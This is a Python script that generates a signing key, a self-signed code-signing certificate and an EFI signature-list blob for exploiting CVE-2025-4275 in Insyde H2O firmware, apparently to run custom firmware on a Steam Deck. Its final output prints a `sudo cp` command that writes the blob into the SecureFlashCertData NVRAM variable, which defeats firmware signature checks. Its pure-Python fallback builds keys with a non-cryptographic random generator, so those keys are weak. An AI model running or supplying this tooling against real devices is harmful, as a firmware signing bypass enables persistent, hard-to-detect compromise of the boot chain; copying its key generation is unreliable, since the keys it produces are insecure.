#!/usr/bin/env python3
"""
SecureFlash Key Pair + ESL Generator
======================================
Generates RSA-2048 signing materials for Insyde H2O firmware signing
via CVE-2025-4275 (Hydroph0bia) certificate injection.

Produces:
  signing_key.pem   - RSA-2048 private key (PEM format)
  signing_cert.pem  - Self-signed X.509 certificate (PEM format)
  signing_cert.der  - Self-signed X.509 certificate (DER format)
  signing_cert.esl  - EFI_SIGNATURE_LIST blob (for NVRAM injection)

The .esl file is ready to be written into the SecureFlashCertData NVRAM
variable using secureflash_inject.py (or manually via efivarfs).

Reference:
  CVE-2025-4275 — https://www.kb.cert.org/vuls/id/211341
  UEFI Spec 2.9 — Section 32.4.1 (EFI_SIGNATURE_LIST)

Usage:
  python3 secureflash_esl.py [--output-dir DIR] [--cn NAME] [--days N]
"""

import argparse
import struct
import hashlib
import os
import sys
import datetime

# ============================================================================
# Constants
# ============================================================================

# EFI_CERT_X509_GUID = {a5c059a1-94e4-4aa7-87b5-ab155c2bf072}
# Mixed-endian UEFI GUID encoding:
#   Data1 (uint32 LE): a5c059a1
#   Data2 (uint16 LE): 94e4
#   Data3 (uint16 LE): 4aa7
#   Data4 (8 bytes BE): 87 b5 ab 15 5c 2b f0 72
EFI_CERT_X509_GUID = bytes([
    0xa1, 0x59, 0xc0, 0xa5,  # Data1 LE
    0xe4, 0x94,              # Data2 LE
    0xa7, 0x4a,              # Data3 LE
    0x87, 0xb5,              # Data4[0:2]
    0xab, 0x15, 0x5c, 0x2b, 0xf0, 0x72  # Data4[2:8]
])

# Owner GUID for our signatures (arbitrary, identifies us as the signer)
# {53444150-4342-544f-4f4c-000000000001} = "SDAPCBTOOL" + 0x01
SD_APCB_OWNER_GUID = bytes([
    0x50, 0x41, 0x44, 0x53,  # "SDAP" (LE)
    0x42, 0x43,              # "BC" (LE)
    0x4f, 0x54,              # "TO" (LE)
    0x4f, 0x4c,              # "OL" (BE)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01  # Padding + version 1
])

# UEFI variable attributes for non-volatile runtime access
EFI_VARIABLE_NV_BS_RT = 0x00000007  # NV | BS | RT

# Default certificate parameters
DEFAULT_CN = "SD APCB Tool"
DEFAULT_DAYS = 3650  # 10 years


# ============================================================================
# DER/ASN.1 Encoding Helpers (from sd_apcb_tool.py v1.7.0)
# ============================================================================

def _der_length(length: int) -> bytes:
    """Encode a DER length field."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    elif length < 0x10000:
        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
    elif length < 0x1000000:
        return bytes([0x83, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])
    else:
        return bytes([0x84, (length >> 24) & 0xFF, (length >> 16) & 0xFF,
                      (length >> 8) & 0xFF, length & 0xFF])


def _der_tag(tag: int, content: bytes) -> bytes:
    """Wrap content with a DER tag and length."""
    return bytes([tag]) + _der_length(len(content)) + content


def _der_sequence(content: bytes) -> bytes:
    return _der_tag(0x30, content)


def _der_set(content: bytes) -> bytes:
    return _der_tag(0x31, content)


def _der_oid(oid_str: str) -> bytes:
    """Encode a dotted OID string to DER."""
    parts = [int(x) for x in oid_str.split('.')]
    encoded = bytes([40 * parts[0] + parts[1]])
    for val in parts[2:]:
        if val < 0x80:
            encoded += bytes([val])
        elif val < 0x4000:
            encoded += bytes([(val >> 7) | 0x80, val & 0x7F])
        elif val < 0x200000:
            encoded += bytes([(val >> 14) | 0x80, ((val >> 7) & 0x7F) | 0x80, val & 0x7F])
        else:
            encoded += bytes([(val >> 21) | 0x80, ((val >> 14) & 0x7F) | 0x80,
                            ((val >> 7) & 0x7F) | 0x80, val & 0x7F])
    return _der_tag(0x06, encoded)


def _der_integer(value) -> bytes:
    """Encode an integer (int or bytes) to DER."""
    if isinstance(value, int):
        if value == 0:
            return _der_tag(0x02, b'\x00')
        result = []
        v = value
        while v > 0:
            result.insert(0, v & 0xFF)
            v >>= 8
        if result[0] & 0x80:
            result.insert(0, 0)
        return _der_tag(0x02, bytes(result))
    return _der_tag(0x02, value)


def _der_octet_string(data: bytes) -> bytes:
    return _der_tag(0x04, data)


def _der_bit_string(data: bytes, unused_bits: int = 0) -> bytes:
    return _der_tag(0x03, bytes([unused_bits]) + data)


def _der_null() -> bytes:
    return bytes([0x05, 0x00])


def _der_context(tag_num: int, content: bytes, constructed: bool = True) -> bytes:
    tag = (0xA0 if constructed else 0x80) | tag_num
    return _der_tag(tag, content)


def _der_utctime(dt: datetime.datetime) -> bytes:
    return _der_tag(0x17, dt.strftime('%y%m%d%H%M%SZ').encode('ascii'))


def _der_generalizedtime(dt: datetime.datetime) -> bytes:
    return _der_tag(0x18, dt.strftime('%Y%m%d%H%M%SZ').encode('ascii'))


def _der_utf8string(s: str) -> bytes:
    return _der_tag(0x0C, s.encode('utf-8'))


def _der_printablestring(s: str) -> bytes:
    return _der_tag(0x13, s.encode('ascii'))


def _der_boolean(val: bool) -> bytes:
    return _der_tag(0x01, bytes([0xFF if val else 0x00]))


# ============================================================================
# OIDs
# ============================================================================

_OID_SHA256_WITH_RSA = '1.2.840.113549.1.1.11'
_OID_RSA_ENCRYPTION = '1.2.840.113549.1.1.1'
_OID_SHA256 = '2.16.840.1.101.3.4.2.1'
_OID_COMMON_NAME = '2.5.4.3'
_OID_BASIC_CONSTRAINTS = '2.5.29.19'
_OID_KEY_USAGE = '2.5.29.15'
_OID_EXT_KEY_USAGE = '2.5.29.37'
_OID_SUBJECT_KEY_ID = '2.5.29.14'
_OID_CODE_SIGNING = '1.3.6.1.5.5.7.3.3'


# ============================================================================
# Certificate Generation (with cryptography library)
# ============================================================================

def _generate_with_cryptography(cn: str, days: int, output_dir: str) -> dict:
    """Generate key pair and certificate using the cryptography library."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509 import (CertificateBuilder, Name, NameAttribute,
                                   NameOID, BasicConstraints, KeyUsage,
                                   ExtendedKeyUsage, SubjectKeyIdentifier)
    from cryptography.x509.oid import ExtendedKeyUsageOID
    from cryptography import x509

    print(f"  Using: cryptography library")

    # Generate RSA-2048 key pair
    print(f"  Generating RSA-2048 key pair...")
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    # Build self-signed X.509 certificate
    print(f"  Building self-signed X.509 certificate...")
    now = datetime.datetime.now(datetime.timezone.utc)
    subject = issuer = Name([NameAttribute(NameOID.COMMON_NAME, cn)])

    cert = (CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=days))
        .add_extension(BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(KeyUsage(
            digital_signature=True, content_commitment=False,
            key_encipherment=False, data_encipherment=False,
            key_agreement=False, key_cert_sign=False,
            crl_sign=False, encipher_only=False, decipher_only=False
        ), critical=True)
        .add_extension(ExtendedKeyUsage([
            ExtendedKeyUsageOID.CODE_SIGNING
        ]), critical=False)
        .sign(key, hashes.SHA256()))

    # Serialize outputs
    key_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    cert_der = cert.public_bytes(serialization.Encoding.DER)

    # Extract info for display
    pub_key = key.public_key()
    pub_numbers = pub_key.public_numbers()
    modulus_bytes = pub_numbers.n.to_bytes(256, byteorder='big')
    fingerprint = hashlib.sha256(cert_der).hexdigest()

    return {
        'key_pem': key_pem,
        'cert_pem': cert_pem,
        'cert_der': cert_der,
        'cn': cn,
        'serial': cert.serial_number,
        'not_before': cert.not_valid_before_utc,
        'not_after': cert.not_valid_after_utc,
        'modulus_sha256': hashlib.sha256(modulus_bytes).hexdigest()[:16],
        'fingerprint': fingerprint[:32],
        'key_size': 2048,
    }


# ============================================================================
# Certificate Generation (pure Python fallback)
# ============================================================================

def _generate_pure_python(cn: str, days: int, output_dir: str) -> dict:
    """Generate key pair and certificate using pure Python RSA.

    This is a minimal implementation for environments without the
    cryptography library. It generates a valid but minimal X.509
    certificate suitable for Authenticode signing.
    """
    import random

    print(f"  Using: pure Python RSA (no cryptography library)")
    print(f"  WARNING: Key generation will be slow (~30-60 seconds)")

    # Generate RSA-2048 key pair
    print(f"  Generating RSA-2048 key pair (this takes a while)...")
    key = _pure_python_rsa_keygen(2048)
    print(f"  Key pair generated.")

    # Build self-signed X.509 certificate
    print(f"  Building self-signed X.509 certificate...")
    now = datetime.datetime.now(datetime.timezone.utc)
    not_after = now + datetime.timedelta(days=days)

    # Random serial number (20 bytes, positive)
    serial = int.from_bytes(random.getrandbits(159).to_bytes(20, 'big'), 'big')

    cert_der = _build_x509_cert(
        cn=cn,
        serial=serial,
        not_before=now,
        not_after=not_after,
        public_key=key['public'],
        private_key=key['private'],
    )

    # Generate PEM format
    import base64
    key_der = _encode_pkcs8_private_key(key['private'])
    key_pem = (b'-----BEGIN PRIVATE KEY-----\n' +
               b'\n'.join(base64.encodebytes(key_der).strip().split(b'\n')) +
               b'\n-----END PRIVATE KEY-----\n')
    cert_pem = (b'-----BEGIN CERTIFICATE-----\n' +
                b'\n'.join(base64.encodebytes(cert_der).strip().split(b'\n')) +
                b'\n-----END CERTIFICATE-----\n')

    modulus_bytes = key['public']['n'].to_bytes(256, byteorder='big')
    fingerprint = hashlib.sha256(cert_der).hexdigest()

    return {
        'key_pem': key_pem,
        'cert_pem': cert_pem,
        'cert_der': cert_der,
        'cn': cn,
        'serial': serial,
        'not_before': now,
        'not_after': not_after,
        'modulus_sha256': hashlib.sha256(modulus_bytes).hexdigest()[:16],
        'fingerprint': fingerprint[:32],
        'key_size': 2048,
    }


def _pure_python_rsa_keygen(bits: int) -> dict:
    """Generate an RSA key pair using pure Python."""
    import random

    def _is_probable_prime(n, k=20):
        """Miller-Rabin primality test."""
        if n < 2:
            return False
        if n == 2 or n == 3:
            return True
        if n % 2 == 0:
            return False
        d, r = n - 1, 0
        while d % 2 == 0:
            d //= 2
            r += 1
        for _ in range(k):
            a = random.randrange(2, n - 1)
            x = pow(a, d, n)
            if x == 1 or x == n - 1:
                continue
            for _ in range(r - 1):
                x = pow(x, 2, n)
                if x == n - 1:
                    break
            else:
                return False
        return True

    def _generate_prime(bits):
        """Generate a random prime number of the given bit length."""
        while True:
            n = random.getrandbits(bits)
            n |= (1 << (bits - 1)) | 1  # Ensure high bit set and odd
            if _is_probable_prime(n):
                return n

    def _modinv(a, m):
        """Compute modular inverse using extended Euclidean algorithm."""
        if a < 0:
            a = a % m
        g, x, _ = _extended_gcd(a, m)
        if g != 1:
            raise ValueError("No modular inverse")
        return x % m

    def _extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        g, x, y = _extended_gcd(b % a, a)
        return g, y - (b // a) * x, x

    half_bits = bits // 2
    e = 65537

    while True:
        p = _generate_prime(half_bits)
        q = _generate_prime(half_bits)
        if p == q:
            continue
        n = p * q
        if n.bit_length() != bits:
            continue
        phi = (p - 1) * (q - 1)
        if phi % e == 0:
            continue
        d = _modinv(e, phi)
        break

    return {
        'public': {'n': n, 'e': e},
        'private': {'n': n, 'e': e, 'd': d, 'p': p, 'q': q},
    }


def _build_x509_cert(cn, serial, not_before, not_after, public_key, private_key):
    """Build a minimal self-signed X.509 v3 certificate in DER format."""
    # Algorithm identifier: SHA256withRSA
    algo_id = _der_sequence(_der_oid(_OID_SHA256_WITH_RSA) + _der_null())

    # Issuer = Subject: CN=<cn>
    rdn = _der_set(_der_sequence(
        _der_oid(_OID_COMMON_NAME) + _der_utf8string(cn)))
    name = _der_sequence(rdn)

    # Validity
    validity = _der_sequence(
        _der_utctime(not_before) + _der_utctime(not_after))

    # Subject public key info
    modulus_bytes = public_key['n'].to_bytes(256, byteorder='big')
    if modulus_bytes[0] & 0x80:
        modulus_bytes = b'\x00' + modulus_bytes
    pub_key_der = _der_sequence(
        _der_integer(public_key['n']) + _der_integer(public_key['e']))
    spki = _der_sequence(
        _der_sequence(_der_oid(_OID_RSA_ENCRYPTION) + _der_null()) +
        _der_bit_string(pub_key_der))

    # Extensions (v3)
    # BasicConstraints: CA=FALSE
    ext_bc = _der_sequence(
        _der_oid(_OID_BASIC_CONSTRAINTS) +
        _der_boolean(True) +  # critical
        _der_octet_string(_der_sequence(b'')))  # CA=FALSE (empty seq)

    # KeyUsage: digitalSignature
    ext_ku = _der_sequence(
        _der_oid(_OID_KEY_USAGE) +
        _der_boolean(True) +  # critical
        _der_octet_string(_der_bit_string(bytes([0x80]), unused_bits=7)))  # bit 0 = digitalSignature

    # ExtendedKeyUsage: codeSigning
    ext_eku = _der_sequence(
        _der_oid(_OID_EXT_KEY_USAGE) +
        _der_octet_string(_der_sequence(_der_oid(_OID_CODE_SIGNING))))

    extensions = _der_context(3, _der_sequence(ext_bc + ext_ku + ext_eku))

    # TBSCertificate
    tbs = _der_sequence(
        _der_context(0, _der_integer(2)) +  # version: v3
        _der_integer(serial) +
        algo_id +
        name +      # issuer
        validity +
        name +      # subject (self-signed)
        spki +
        extensions)

    # Sign TBSCertificate
    tbs_hash = hashlib.sha256(tbs).digest()
    # PKCS#1 v1.5 padding for SHA-256
    digest_info = _der_sequence(
        _der_sequence(_der_oid(_OID_SHA256) + _der_null()) +
        _der_octet_string(tbs_hash))
    em = _pkcs1_v15_pad(digest_info, 256)
    sig_int = int.from_bytes(em, 'big')
    sig_value = pow(sig_int, private_key['d'], private_key['n'])
    sig_bytes = sig_value.to_bytes(256, byteorder='big')

    # Full certificate
    return _der_sequence(
        tbs + algo_id + _der_bit_string(sig_bytes))


def _pkcs1_v15_pad(digest_info: bytes, key_length: int) -> bytes:
    """PKCS#1 v1.5 signature padding (Type 1)."""
    pad_len = key_length - len(digest_info) - 3
    if pad_len < 8:
        raise ValueError("Key too short for this digest")
    return b'\x00\x01' + b'\xff' * pad_len + b'\x00' + digest_info


def _encode_pkcs8_private_key(private_key: dict) -> bytes:
    """Encode RSA private key in PKCS#8 DER format."""
    # RSAPrivateKey
    rsa_key = _der_sequence(
        _der_integer(0) +  # version
        _der_integer(private_key['n']) +
        _der_integer(private_key['e']) +
        _der_integer(private_key['d']) +
        _der_integer(private_key['p']) +
        _der_integer(private_key['q']) +
        _der_integer(private_key['d'] % (private_key['p'] - 1)) +  # dp
        _der_integer(private_key['d'] % (private_key['q'] - 1)) +  # dq
        _der_integer(pow(private_key['q'], -1, private_key['p'])))  # qinv

    # PKCS#8 PrivateKeyInfo
    return _der_sequence(
        _der_integer(0) +
        _der_sequence(_der_oid(_OID_RSA_ENCRYPTION) + _der_null()) +
        _der_octet_string(rsa_key))


# ============================================================================
# EFI_SIGNATURE_LIST Builder
# ============================================================================

def build_esl(cert_der: bytes) -> bytes:
    """Build an EFI_SIGNATURE_LIST containing a single X.509 certificate.

    EFI_SIGNATURE_LIST structure (UEFI Spec 2.9, Section 32.4.1):

      Offset  Size  Field
      ------  ----  -----
      0       16    SignatureType (EFI_CERT_X509_GUID)
      16      4     SignatureListSize (total size including header)
      20      4     SignatureHeaderSize (0 for X.509)
      24      4     SignatureSize (16 + len(cert_der))

    Followed by one EFI_SIGNATURE_DATA:
      Offset  Size  Field
      ------  ----  -----
      28      16    SignatureOwner (our GUID)
      44      var   SignatureData (cert DER bytes)

    Args:
        cert_der: DER-encoded X.509 certificate bytes.

    Returns:
        Complete EFI_SIGNATURE_LIST blob.
    """
    sig_size = 16 + len(cert_der)       # owner GUID + cert data
    list_size = 28 + sig_size           # header + one signature entry
    header_size = 0                      # no extra header for X.509

    # EFI_SIGNATURE_LIST header
    esl = bytearray()
    esl.extend(EFI_CERT_X509_GUID)              # SignatureType
    esl.extend(struct.pack('<I', list_size))      # SignatureListSize
    esl.extend(struct.pack('<I', header_size))    # SignatureHeaderSize
    esl.extend(struct.pack('<I', sig_size))        # SignatureSize

    # EFI_SIGNATURE_DATA
    esl.extend(SD_APCB_OWNER_GUID)               # SignatureOwner
    esl.extend(cert_der)                          # SignatureData

    return bytes(esl)


def build_efivar_blob(esl: bytes) -> bytes:
    """Prepend UEFI variable attributes for efivarfs write.

    When writing to /sys/firmware/efi/efivars/, the first 4 bytes must be
    the UEFI variable attributes as a little-endian uint32.

    Args:
        esl: EFI_SIGNATURE_LIST blob.

    Returns:
        Complete blob with attributes prefix, ready for efivarfs write.
    """
    return struct.pack('<I', EFI_VARIABLE_NV_BS_RT) + esl


# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Generate RSA-2048 signing materials for SecureFlash certificate injection')
    parser.add_argument('--output-dir', '-o', default='.',
                        help='Output directory for generated files (default: current dir)')
    parser.add_argument('--cn', default=DEFAULT_CN,
                        help=f'Certificate Common Name (default: "{DEFAULT_CN}")')
    parser.add_argument('--days', type=int, default=DEFAULT_DAYS,
                        help=f'Certificate validity in days (default: {DEFAULT_DAYS})')
    args = parser.parse_args()

    output_dir = os.path.abspath(args.output_dir)
    os.makedirs(output_dir, exist_ok=True)

    print("=" * 68)
    print("SecureFlash Key Pair + ESL Generator")
    print("=" * 68)
    print()
    print(f"  Common Name:  {args.cn}")
    print(f"  Validity:     {args.days} days")
    print(f"  Output dir:   {output_dir}")
    print()

    # Try cryptography library first, fall back to pure Python
    print("Step 1: Generate key pair and certificate")
    try:
        result = _generate_with_cryptography(args.cn, args.days, output_dir)
    except ImportError:
        print("  cryptography library not available, using pure Python fallback")
        result = _generate_pure_python(args.cn, args.days, output_dir)

    print(f"  Key size:     {result['key_size']} bits")
    print(f"  CN:           {result['cn']}")
    print(f"  Serial:       {result['serial']}")
    print(f"  Valid from:   {result['not_before']}")
    print(f"  Valid until:  {result['not_after']}")
    print(f"  Modulus hash: {result['modulus_sha256']}...")
    print(f"  Cert SHA-256: {result['fingerprint']}...")
    print()

    # Build ESL
    print("Step 2: Build EFI_SIGNATURE_LIST")
    esl = build_esl(result['cert_der'])
    efivar_blob = build_efivar_blob(esl)

    print(f"  Certificate DER: {len(result['cert_der'])} bytes")
    print(f"  ESL blob:        {len(esl)} bytes (28-byte header + 16-byte owner + cert)")
    print(f"  efivar blob:     {len(efivar_blob)} bytes (4-byte attrs + ESL)")
    print()

    # Verify ESL structure
    print("Step 3: Verify ESL structure")
    sig_type = esl[:16]
    list_size = struct.unpack_from('<I', esl, 16)[0]
    header_size = struct.unpack_from('<I', esl, 20)[0]
    sig_size = struct.unpack_from('<I', esl, 24)[0]

    assert sig_type == EFI_CERT_X509_GUID, "Bad SignatureType GUID"
    assert list_size == len(esl), f"ListSize mismatch: {list_size} != {len(esl)}"
    assert header_size == 0, f"HeaderSize should be 0, got {header_size}"
    assert sig_size == 16 + len(result['cert_der']), f"SigSize mismatch"

    # Verify cert DER is parseable (extract CN back)
    cert_in_esl = esl[44:]  # After header (28) + owner GUID (16)
    cn_check = _extract_cn(cert_in_esl)
    assert cn_check == args.cn, f"CN mismatch: expected '{args.cn}', got '{cn_check}'"

    print(f"  SignatureType:     EFI_CERT_X509_GUID (OK)")
    print(f"  SignatureListSize: {list_size} (OK)")
    print(f"  SignatureSize:     {sig_size} (OK)")
    print(f"  Owner GUID:        {_guid_to_str(SD_APCB_OWNER_GUID)}")
    print(f"  Embedded cert CN:  {cn_check} (OK)")
    print()

    # Write output files
    print("Step 4: Write output files")
    files = {
        'signing_key.pem': result['key_pem'],
        'signing_cert.pem': result['cert_pem'],
        'signing_cert.der': result['cert_der'],
        'signing_cert.esl': efivar_blob,
    }

    for filename, data in files.items():
        filepath = os.path.join(output_dir, filename)
        with open(filepath, 'wb') as f:
            f.write(data)
        print(f"  {filename}: {len(data)} bytes -> {filepath}")

    print()

    # Hex dump of ESL header
    print("Step 5: ESL blob hex dump (first 64 bytes)")
    for i in range(0, min(len(efivar_blob), 64), 16):
        chunk = efivar_blob[i:i + 16]
        hex_str = ' '.join(f'{b:02X}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f"  {i:04X}: {hex_str:<48s} {ascii_str}")

    print()
    print("=" * 68)
    print("DONE")
    print("=" * 68)
    print()
    print("Next steps:")
    print(f"  1. Copy signing_cert.esl to your Steam Deck")
    print(f"  2. Run secureflash_check.py on Steam Deck to verify vulnerability")
    print(f"  3. If vulnerable, inject the certificate into NVRAM:")
    print(f"     sudo cp signing_cert.esl \\")
    print(f"       /sys/firmware/efi/efivars/SecureFlashCertData-382af2bb-ffff-abcd-aaee-cce099338877")
    print(f"  4. Use signing_key.pem + signing_cert.der for firmware signing")
    print()
    print("IMPORTANT: Keep signing_key.pem SAFE. Anyone with this key can sign")
    print("           firmware that your device will accept after injection.")


def _extract_cn(cert_der: bytes) -> str:
    """Extract Common Name from DER-encoded X.509 certificate."""
    cn_oid = bytes([0x55, 0x04, 0x03])
    pos = 0
    while pos < len(cert_der) - 5:
        if (cert_der[pos] == 0x06 and cert_der[pos + 1] == 0x03 and
                cert_der[pos + 2:pos + 5] == cn_oid):
            val_pos = pos + 5
            if val_pos < len(cert_der):
                val_tag = cert_der[val_pos]
                if val_tag in (0x0C, 0x13, 0x16):
                    val_len = cert_der[val_pos + 1]
                    if val_len < 0x80:
                        return cert_der[val_pos + 2:val_pos + 2 + val_len].decode('utf-8')
        pos += 1
    return None


def _guid_to_str(guid_bytes: bytes) -> str:
    """Format 16-byte mixed-endian UEFI GUID as string."""
    d1 = struct.unpack_from('<I', guid_bytes, 0)[0]
    d2 = struct.unpack_from('<H', guid_bytes, 4)[0]
    d3 = struct.unpack_from('<H', guid_bytes, 6)[0]
    d4 = guid_bytes[8:10].hex()
    d5 = guid_bytes[10:16].hex()
    return f"{d1:08x}-{d2:04x}-{d3:04x}-{d4}-{d5}"


if __name__ == '__main__':
    main()
